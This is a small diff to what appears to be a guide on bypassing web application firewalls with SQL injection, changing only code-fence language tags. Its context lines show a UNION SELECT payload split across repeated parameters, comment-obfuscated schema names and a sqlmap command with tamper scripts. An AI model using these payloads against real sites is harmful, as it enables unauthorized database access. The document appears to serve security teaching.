@@ -167,7 +167,7 @@ INF/**/ORMATION_/**/SCHEMA.tables
 
 Some WAFs can be bypassed by splitting the payload across multiple parameters:
 
-```
+```text
 ?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3
 ```
 
@@ -201,7 +201,7 @@ If basic injection patterns are blocked:
 
 Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:
 
-```
+```bash
 sqlmap --url="http://target/page.php?id=1" --tamper=space2comment,charencode --random-agent
 ```
 
